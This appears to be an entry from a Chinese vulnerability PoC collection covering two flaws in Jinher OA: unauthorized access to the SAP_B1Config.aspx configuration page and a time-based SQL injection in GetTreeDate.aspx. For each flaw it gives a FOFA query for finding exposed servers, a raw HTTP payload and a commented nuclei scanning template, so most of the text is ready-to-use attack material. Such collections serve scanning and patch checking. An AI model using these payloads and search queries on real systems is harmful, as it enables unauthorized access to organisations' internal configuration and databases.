## 金和OA SAP_B1Config 未授权访问

#### fofa

> app="金和网络-金和OA"

#### poc

```http
GET /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: Jinher-SAP_B1Config-unauthorized
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: 金和OA SAP_B1Config 未授权访问
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 2
  tags: Jinher
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    path:
      - "{{BaseURL}}/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1"
      # {{BaseURL}} 使用请求中的 URL 内容

    stop-at-first-match: true
    # 命中第一个匹配就返回

    matchers-condition: and
    # 匹配规则的逻辑关系，and 表示所有匹配条件必须都为 true
    matchers:
    # 匹配规则
      - type: word
        part: body
        words:
          - 'txtDatabaseServer'
          - 'txtLicenseServer'
        condition: and

      - type: status
        # 对状态码进行匹配
        status:
          - 200
```

---

## 金和OA GetHomeInfo SQL注入

#### fofa

> app="金和网络-金和OA"

#### poc

```http
GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1 HTTP/1.1
Host: 
```

#### nuclei

```yaml
id: Jinher-GetHomeInfo-SQLInject
# 模板的唯一标识，nuclei 扫描期间会输出该内容

info:
# 信息
  name: 金和OA GetHomeInfo SQL注入
  # 漏洞名称
  author: mewhz
  # 作者
  severity: low
  # 严重程度
  metadata:
  # 元数据
    max-request: 1
  tags: Jinher
  # 标签，可以通过标签进行扫描

http:
# http 请求
  - method: GET
    # 请求方法
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1"
      # {{BaseURL}} 使用请求中的 URL 内容

    matchers:
    # 匹配规则
      - type: dsl
        dsl:
          - 'duration_1 >= 4 && status_code_1 == 200 && status_code_2 == 200'
          # 响应时间大于或等于 4 秒
```

---